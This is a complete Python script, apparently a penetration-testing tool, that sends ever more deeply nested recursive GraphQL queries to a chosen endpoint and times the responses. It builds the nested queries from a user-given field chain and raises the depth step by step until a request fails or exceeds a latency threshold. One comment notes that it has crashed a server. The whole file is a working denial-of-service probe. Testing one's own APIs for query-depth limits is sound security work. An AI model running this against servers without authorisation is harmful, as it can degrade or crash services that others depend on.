import requests
import json
import time
import sys
import os
import argparse

try:
    from colorama import init, Fore
    init(autoreset=True)
except ImportError:
    print("Install colorama for colored output: pip install colorama")
    sys.exit(1)


def send_graphql_request(url, payload, timeout=None):
    """
    Send a GraphQL request and return (success, elapsed, status_code, response_text).
    Measures request duration and handles response output.
    """
    start = time.time()
    try:
        resp = requests.post(url, json=payload, timeout=timeout)
    except Exception as e:
        print(f"{Fore.RED}[Error] Exception – {e}")
        return False, None, None, str(e)

    elapsed = time.time() - start
    if resp.ok:
        print(f"{Fore.GREEN}[OK]   Depth {payload.get('depth', '?')} completed in {elapsed:.2f}s (HTTP {resp.status_code})")
        return True, elapsed, resp.status_code, resp.text
    else:
        print(f"{Fore.RED}[FAIL] Depth {payload.get('depth', '?')} HTTP {resp.status_code} in {elapsed:.2f}s")
        print(resp.text[:200])  # Print only first 200 chars of error
        return False, elapsed, resp.status_code, resp.text
    

def build_recursive_query(chain, depth, root_field=None, root_args=None):
    """
    Constructs a deeply nested GraphQL query string using a repeating chain of fields.

    Parameters:
        chain (list): Sequence of field names, e.g., ['pastes', 'owner'].
        depth (int): How many times to repeat the full chain.
        root_field (str): Optional root field (e.g., 'user') to wrap the recursion inside.
        root_args (str): Optional arguments for root field (e.g., 'where: {id: \"xyz\"}').

    Returns:
        str: A GraphQL query string with nested fields and __typename at the leaf.
    """
    # Iteratively build nested field access from outermost to innermost
    nested = "__typename" # start with typename, as that is the innermost thingy

    # As we begin from inside out: use reverse indexing so that the first chain element is the outermost field -> need to keep 
    for i in range(depth):
        idx = (depth - i - 1) % len(chain) # Example: With chain = ['a', 'b'] and depth = 4, idx is: 1, 0, 1, 0 → b, a, b, a
        field = chain[idx] # get field based on index
        nested = f"{field} {{ {nested} }}" # wrap the current field around the old one => Builds outward: field1 { field2 { ... { __typename }}} 
        # ("{{" becomes "{" in final string) and {nested} is a normal f-string same with {field}

    # Wrap with optional root field and arguments
    if root_field:
        args_str = f"({root_args})" if root_args else ""
        return f"query recursiveTest {{ {root_field}{args_str} {{ {nested} }} }}"
    else:
        return f"query recursiveTest {{ {nested} }}"


def main():
    parser = argparse.ArgumentParser(description="GraphQL DoS-Recursion tester")

    # Required arguments
    parser.add_argument("--url", "-u", required=True, help="GraphQL endpoint URL")
    parser.add_argument("--chain", "-c", nargs='+', required=True, help="Fields for recursion chain")

    # Optional recursion wrapper in case the first field needs to specify some additional arguments e.g. users (id: "bla")
    parser.add_argument("--root", type=str, help="Optional root field to wrap around recursion")
    parser.add_argument("--root-args", type=str, help="Arguments for root field (e.g., 'where: {id: \"xyz\"}')")

    # Optional tuning arguments
    parser.add_argument("--start-depth", type=int, default=2, help="Starting depth")
    parser.add_argument("--max-depth", type=int, default=20, help="Maximum depth")
    parser.add_argument("--step", type=int, default=2, help="Increment step")

    args = parser.parse_args()

    # Validate even constraints otherwise it will mess up our look in build_recursive_query
    if args.start_depth % 2 != 0 or args.step % 2 != 0:
        parser.error("--start-depth and --step must both be even numbers.")

    # make the args look nice
    url = args.url
    chain = args.chain
    start, max_d, step = args.start_depth, args.max_depth, args.step
    timeout = 10.0 # to limit how long we wait for responses from the server; Otherwise I was waiting minutes until I notices that the server crashed
    threshold = 5.0 # measures the actual time it took for a successful response to arrive; If a request takes longer than this, assume server is overwhelmed and abort further tests
    root, root_args = args.root, args.root_args

    # Because we feel fancy today
    print("\n")
    print(f"Testing recursion: {' -> '.join(chain)}")
    if root:
        print(f"Wrapped in root field: {root}({root_args})")
    print(f"Depths {start}-{max_d} (step {step}) with timeout={timeout}s and threshold={threshold}s")
    print("\n")
    print('-' * 60)
    print("\n")

    # to save results
    results = []

    # let's goooo
    for depth in range(start, max_d + 1, step):
        # Build our recursion query
        query_str = build_recursive_query(chain, depth, root, root_args)
        print("\nThe following query was build:" + query_str)
        payload = {'query': query_str, 'variables': {}, 'depth': depth}

        # Send the request
        success, elapsed, status, _ = send_graphql_request(url, payload, timeout)
        results.append((depth, success, elapsed, status)) # save which depth it was, if it succeeded, the time and HTTP code

        # Stop on early failure or latency threshold breach
        if not success or (elapsed and elapsed > threshold):
            print("\n" + f"Stopping at depth {depth} (elapsed {elapsed:.2f}s)")
            break

    # Final summary (once again I am feeling fancy)
    print("\nSummary:")
    for depth, success, elapsed, status in results:
        result = "OK" if success else "FAIL"
        print(f"Depth {depth:>3}: {result} in {elapsed:.2f}s (HTTP {status})")

if __name__ == "__main__":
    main()